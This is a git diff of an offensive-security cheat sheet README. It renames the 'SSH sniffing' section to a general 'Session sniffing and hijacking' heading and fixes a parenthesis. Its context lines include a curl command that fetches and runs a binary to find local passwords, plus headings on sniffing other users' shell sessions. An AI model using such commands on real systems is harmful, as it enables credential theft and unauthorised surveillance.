@@ -90,7 +90,7 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
       1. [cryptsetup](#crypto-filesystem)
       1. [EncFS](#encfs)
    1. [Encrypting a file](#encrypting-file)
-1. [SSH session sniffing and hijacking](#ssh-sniffing)
+1. [Session sniffing and hijacking](#sniffing)
    1. [Sniff a user's SHELL session](#session-sniffing)
    2. [Sniff all SHELL sessions with dtrace](#dtrace)
    2. [Sniff all SHELL sessions with eBPF](#bpf)
@@ -1675,7 +1675,7 @@ wfind() {
 # Usage: wfind /etc /var /usr 
 ```
 
-Find local passwords (using [noseyparker](https://github.com/praetorian-inc/noseyparker):
+Find local passwords (using [noseyparker](https://github.com/praetorian-inc/noseyparker)):
 ```sh
 curl -o np -fsSL https://github.com/hackerschoice/binary/raw/main/tools/noseyparker-x86_64-static
 ./np scan . && \
@@ -1883,8 +1883,8 @@ openssl enc -d -aes-256-cbc -pbkdf2 -k fOUGsg1BJdXPt0CY4I <input.txt.enc >input.
 ```
 
 ---
-<a id="ssh-sniffing"></a>
-## 10. SSH Sniffing
+<a id="sniffing"></a>
+## 10. Session sniffing and hijaking
 <a id="session-sniffing"></a>
 **10.i Sniff a user's SHELL session**
 
